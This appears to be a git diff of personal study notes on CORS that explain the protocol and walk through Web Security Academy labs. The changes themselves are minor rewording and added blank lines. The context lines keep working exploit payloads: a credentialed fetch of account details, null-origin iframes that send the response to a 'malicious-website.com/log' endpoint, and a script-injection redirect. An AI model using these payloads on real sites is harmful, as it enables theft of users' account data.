@@ -16,11 +16,11 @@
 ## How does CORS work?
 
 - The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.
-- The `Access-Control-Allow-Origin` header is included in the response from one website to a request originating from another website and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
+- The `Access-Control-Allow-Origin` header is included in the response from one website to a request originated from another website and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
 - Usually when we send a request from a website `normal-website.com` to another domain `robust-website.com` the browser puts in the request the following header to make the server know what's the *origin* of the request:
 
 ```http
-Origin: https://b.example.com
+Origin: https://normal-website.com
 ```
 
 The request would be like this:
@@ -62,11 +62,10 @@ Access-Control-Allow-Origin: https://normal-website.com
 Access-Control-Allow-Credentials: true
 ```
 
-
 ## Vulnerabilities and common mistakes
 
-
 ###### Lab: CORS vulnerability with basic origin reflection 
+
 ```html
 <script>  
 fetch('https://0afa00b803fd481c83315b74001800f2.web-security-academy.net/accountDetails', {credentials:'include'})  
@@ -103,6 +102,7 @@ Some applications might whitelist the `null` origin to support local developme
 In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access.
 
 ##### Lab: CORS vulnerability with trusted null origin
+
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
 <script> 
@@ -116,6 +116,7 @@ location='malicious-website.com/log?key='+this.responseText;
 ```
 
 or:
+
 ```html
 <iframe sandbox='allow-scripts' srcdoc="  
 <script>  
@@ -137,6 +138,7 @@ Suppose an application that rigorously employs HTTPS also whitelists a trusted s
 In this situation, an attacker who is in a position to intercept a victim user's traffic (*man-in-the-middle attack*) can exploit the CORS configuration to compromise the victim's interaction with the application.
 
 ##### Lab: CORS vulnerability with trusted insecure protocols
+
 ```html
 <script>  
 location = 'http://stock.0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/?storeId=1&productId=<script>' +  
